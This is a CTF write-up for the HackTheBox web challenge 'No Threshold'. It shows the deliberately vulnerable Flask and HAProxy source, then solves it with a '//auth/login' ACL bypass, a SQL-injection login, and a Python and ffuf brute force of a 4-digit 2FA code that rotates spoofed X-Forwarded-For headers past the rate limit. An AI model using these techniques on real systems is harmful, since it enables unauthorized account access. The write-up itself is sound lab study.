# Web

## Description

Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩

## Source

`entrypoint.sh`
```bash
#!/bin/sh

DB_PATH="/opt/www/app/nothreshold.db"

sqlite3 "$DB_PATH" <<EOF
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
);
INSERT INTO users (username, password) VALUES ('admin', '$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)');
.quit
EOF

uwsgi --ini /opt/www/app/uwsgi.ini &

haproxy -f /etc/haproxy/haproxy.cfg 

tail -f /dev/null
```

`conf/uwsgi.ini`
```ini
[uwsgi]
chdir = /opt/www/

http-socket = 0.0.0.0:8888
master = true
processes = 4
http-timeout = 86400
single-interpreter = true
enable-threads = true
thunder-lock = true
disable-logging = true 

module = app:app

# Enable Internal Cache for 2FA Codes 
cache2 = name=2fa-code,items=1000
```

`conf/haproxy.cfg`
```ini
global
    daemon
    maxconn 256

defaults
    mode http
    option forwardfor

    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    # Parse the X-Forwarded-For header value if it exists. If it doesn't exist, add the client's IP address to the X-Forwarded-For header. 
    http-request add-header X-Forwarded-For %[src] if !{ req.hdr(X-Forwarded-For) -m found }
    
    # Apply rate limit on the /auth/verify-2fa route.
    acl is_auth_verify_2fa path_beg,url_dec /auth/verify-2fa

    # Checks for valid IPv4 address in X-Forwarded-For header and denies request if malformed IPv4 is found. (Application accepts IP addresses in the range from 0.0.0.0 to 255.255.255.255.)
    acl valid_ipv4 req.hdr(X-Forwarded-For) -m reg ^([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])$
    
    http-request deny deny_status 400 if is_auth_verify_2fa !valid_ipv4

    # Crate a stick-table to track the number of requests from a single IP address. (1min expire)
    stick-table type ip size 100k expire 60s store http_req_rate(60s)

    # Deny users that make more than 20 requests in a small timeframe.
    http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
    http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }

    # External users should be blocked from accessing routes under maintenance.
    http-request deny if { path_beg /auth/login }

backend backend
    balance roundrobin
    server s1 0.0.0.0:8888 maxconn 32 check
```

`challenge/__init__.py`
```python
from app.blueprints.verify2fa import *
from app.blueprints.dashboard import *
from app.blueprints.login import *
from app.blueprints.index import *
from app.config import Config
from flask import Flask

app = Flask(__name__)

app.config["SECRET_KEY"] = Config.SECRET_KEY

app.register_blueprint(index_bp)
app.register_blueprint(dashboard_bp)
app.register_blueprint(login_bp, url_prefix="/auth")
app.register_blueprint(verify2fa_bp, url_prefix="/auth")
```

`challenge/blueprints/dashboard.py`
```python
from flask import Blueprint, render_template, request, jsonify, session, redirect
from app.config import Config

dashboard_bp = Blueprint("dashboard", __name__, template_folder="templates")

def requires_authentication(func):
    def wrapper(*args, **kwargs):
        if session.get("authenticated"):
            return func(*args, **kwargs)
        else:
            return redirect("/auth/login")

    return wrapper


@dashboard_bp.route("/dashboard", methods=["GET"])
@requires_authentication
def dash():
    return render_template("private/dashboard.html", flag=Config.FLAG)
```

`challenge/blueprints/login.py`
```python
from flask import Blueprint, render_template, request, jsonify, redirect
from app.database import *
import random
import string
import uwsgi

login_bp = Blueprint("login", __name__, template_folder="templates")

def set_2fa_code(d):
    uwsgi.cache_del("2fa-code")
    uwsgi.cache_set(
        "2fa-code", "".join(random.choices(string.digits, k=d)), 300 # valid for 5 min
    ) 

@login_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return render_template("public/login.html", error_message="Username or password is empty!"), 400
        try:
            user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )

            if user is None:
                return render_template("public/login.html", error_message="Invalid username or password"), 400

            set_2fa_code(4)

            return redirect("/auth/verify-2fa")
        finally:
            close_db()
    return render_template("public/login.html")
```

`challenge/blueprints/verify2fa.py`
```python
from flask import Blueprint, render_template, request, jsonify, session, redirect
import uwsgi

verify2fa_bp = Blueprint("verify2fa", __name__, template_folder="templates")

def requires_2fa(func):
    def wrapper(*args, **kwargs):
        if uwsgi.cache_exists("2fa-code"):
            return func(*args, **kwargs)
        else:
            return redirect("/auth/login")

    return wrapper


@verify2fa_bp.route("/verify-2fa", methods=["GET", "POST"])
@requires_2fa
def verify():
    if request.method == "POST":

        code = request.form.get("2fa-code")
        
        if not code:
            return render_template("private/verify2fa.html", error_message="2FA code is empty!"), 400

        stored_code = uwsgi.cache_get("2fa-code").decode("utf-8")

        if code == stored_code:
            uwsgi.cache_del("2fa-code")
            session["authenticated"] = True
            return redirect("/dashboard")

        else:
            return render_template("private/verify2fa.html", error_message="Invalid 2FA Code!"), 400
    return render_template("private/verify2fa.html")
```

## Solution

![no-threshold.png](/assets/ctf/htb/web/no-threshold.png)

So first of all we can't do anything in the Shop, because we need to Login. To login we need to bypass the `403` set by HAProxy.

The login is denied to any request coming from outside, but only to `/auth/login`, meaning we can tamper with the URL such as `//auth/login` and it will not get blocked and we are able to bypass the proxy rule.
```bash
# External users should be blocked from accessing routes under maintenance.
http-request deny if { path_beg /auth/login }
```

![no-threshold-1.png](/assets/ctf/htb/web/no-threshold-1.png)

Because login does raw SQL queries we can just do simplest SQLi and bypass it, but the web redirects us to url without `//` as prefix so catch the request via burp and modify the path:

![no-threshold-2.png](/assets/ctf/htb/web/no-threshold-2.png)

Now we need to get `2FA Code` somehow

![no-threshold-3.png](/assets/ctf/htb/web/no-threshold-3.png)

The code is set by `uwsgi` API, it's 4 digits long (because login creates it: `set_2fa_code(4)`)  
```python
def set_2fa_code(d):
    uwsgi.cache_del("2fa-code")
    uwsgi.cache_set(
        "2fa-code", "".join(random.choices(string.digits, k=d)), 300 # valid for 5 min
    ) 
```

```bash
└─$ seq -f '%04g' 0 9999 > codes
└─$ for i in {0..39}; do c=$(( RANDOM % 255 )); for d in {0..255}; do echo "192.168.$c.$d";  done; done > ips
└─$ curl 'http://83.136.253.211:36477//auth/login' -d 'username=admin%27+--+-+&password=x'
└─$ ffuf -u 'http://83.136.253.211:36477//auth/verify-2fa' -d '2fa-code=CODE' -H 'X-Forwarded-For: HOST' -w './codes:CODE,./ips:HOST' -H 'Content-Type: application/x-www-form-urlencoded' -mode pitchfork -se -r
```

The server didn't like async code... so brute with non async 😭

```python
import requests

def generate_pins():
    for pin in range(10_000):
        yield str(pin).zfill(4)

def generate_ips(repeat=5):
    for i in range(1, 256):  
        for j in range(1, 256):  
            for _ in range(repeat):
                yield f"10.10.{i}.{j}"

URL = 'http://83.136.252.63:42815'

def fetch(pin, ip):
    resp = requests.post(
        f'{URL}/auth/verify-2fa', 
        data={'2fa-code': pin},
        headers={'X-Forwarded-For': ip}   
    )   
    print(f'{ip=}, {pin=}, status={resp.status_code}')
    if resp.status_code == 403:
        print('Attemp failed!' + ' ' * 16)
        exit()
    elif "Invalid 2FA Code" in resp.text:
        return False
    
    print()
    print(f'>>> {ip=}, {pin=}, status={resp.status_code}')
    print(resp.text)
    return True

# Login
requests.post(
    f'{URL}//auth/login', 
    data={'username': "admin' -- -", 'password': 'x'}
)

for pin, ip  in zip(generate_pins(), generate_ips()):
    result = fetch(pin, ip)
    if result:
        break
```

```bash
ip='10.10.2.65', pin='1597', status=400
ip='10.10.2.65', pin='1598', status=200

>>> ip='10.10.2.65', pin='1598', status=200
...
Welcome, here is your flag: <b> HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35} </b>
...
```

> Flag: `HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}`

